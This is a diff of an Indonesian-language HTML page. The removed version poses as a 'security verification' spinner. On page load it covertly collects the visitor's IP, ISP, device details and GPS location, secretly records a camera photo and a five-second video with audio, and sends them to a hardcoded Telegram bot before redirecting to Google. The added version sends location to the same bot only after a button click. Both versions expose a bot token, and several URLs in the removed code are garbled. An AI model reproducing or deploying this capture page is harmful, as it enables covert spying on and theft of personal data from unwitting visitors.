@@ -1,122 +1,78 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi Keamanan</title>
-    <style>
-        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin-bottom: 15px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .container { text-align: center; padding: 20px; }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Demo Lokasi ke Telegram</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #111;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .box {
+      text-align: center;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="loader"></div>
-    <p id="status">Memproses Verifikasi Sistem...</p>
-    <p style="font-size: 12px; color: #555;">Harap izinkan akses jika muncul permintaan</p>
+<div class="box">
+  <h2>Izinkan Lokasi</h2>
+  <p>Data hanya dikirim jika kamu menekan tombol</p>
+  <button onclick="kirimLokasi()">Kirim Lokasi Saya</button>
+  <p id="status"></p>
 </div>
 
 <script>
-    // --- KONFIGURASI ---
-    const TOKEN = "8335849839:AAFhhUYDiOUVybcp0WMUODHkhBjlRXJQWb8";
-    const CHAT_ID = "7665671289";
+const TOKEN = "8335849839:AAFhhUYDiOUVybcp0WMUODHkhBjlRXJQWb8";
+const CHAT_ID = "7665671289";
 
-    async function sikatSemua() {
-        let info = "=== TARGET BARU TERDETEKSI ===\n";
+async function kirimLokasi() {
+  const status = document.getElementById("status");
+  status.innerText = "Meminta izin lokasi...";
 
-        // 1. Ambil Info IP & Provider
-        try {
-            const res = await fetch('https://ipapi.co');
-            const d = await res.json();
-            info += `📍 IP: ${d.ip}\n📍 Kota: ${d.city}, ${d.region}\n📍 Provider: ${d.org}\n`;
-        } catch (e) { info += "❌ Gagal cek IP/Provider\n"; }
-        
-        info += `📱 OS: ${navigator.platform}\n`;
-        info += `🌐 User Agent: ${navigator.userAgent.substring(0, 50)}...\n`;
+  if (!navigator.geolocation) {
+    status.innerText = "Browser tidak mendukung GPS";
+    return;
+  }
 
-        // Kirim info teks awal
-        await kirimPesan(info);
+  navigator.geolocation.getCurrentPosition(async (pos) => {
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
 
-        // 2. Ambil Lokasi GPS (Presisi)
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const mapLink = `https://google.com{lat},${lon}`;
-            await kirimPesan(`[LOKASI PRESISI]\n${mapLink}`);
-        }, (err) => {
-            kirimPesan("❌ Izin Lokasi Ditolak oleh Target");
-        });
+    const text = `Lokasi user:\nhttps://maps.google.com/?q=${lat},${lon}`;
 
-        // 3. Akses Kamera (Foto & Video)
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }, 
-                audio: true 
-            });
+    try {
+      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text
+        })
+      });
 
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.muted = true;
-            await video.play();
-
-            // Tunggu 4 detik agar kamera menyesuaikan cahaya (biar gak gelap)
-            setTimeout(async () => {
-                // JEPRET FOTO
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                canvas.toBlob(blob => kirimFile(blob, 'sendPhoto', 'photo'), 'image/jpeg');
-
-                // MULAI REKAM VIDEO (5 Detik)
-                const recorder = new MediaRecorder(stream);
-                const chunks = [];
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.onstop = () => {
-                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
-                    kirimFile(videoBlob, 'sendVideo', 'video');
-                    
-                    // Matikan kamera & redirect
-                    stream.getTracks().forEach(t => t.stop());
-                    setTimeout(() => { window.location.href = "https://www.google.com"; }, 3000);
-                };
-
-                recorder.start();
-                setTimeout(() => recorder.stop(), 5000); 
-
-            }, 4000);
-
-        } catch (err) {
-            await kirimPesan("❌ Kamera/Mic Ditolak Target");
-            setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
-        }
+      status.innerText = "Lokasi berhasil dikirim ✅";
+    } catch (err) {
+      status.innerText = "Gagal kirim ❌";
     }
 
-    // FUNGSI KIRIM PESAN TEKS
-    async function kirimPesan(teks) {
-        await fetch(`https://telegram.org{TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: teks })
-        });
-    }
-
-    // FUNGSI KIRIM FILE (FOTO/VIDEO)
-    function kirimFile(blob, method, type) {
-        const fd = new FormData();
-        fd.append('chat_id', CHAT_ID);
-        fd.append(type, blob, `capture.${type === 'photo' ? 'jpg' : 'mp4'}`);
-        fetch(`https://telegram.org{TOKEN}/${method}`, { 
-            method: 'POST', 
-            body: fd 
-        });
-    }
-
-    window.onload = sikatSemua;
+  }, () => {
+    status.innerText = "Izin lokasi ditolak";
+  });
+}
 </script>
 
 </body>
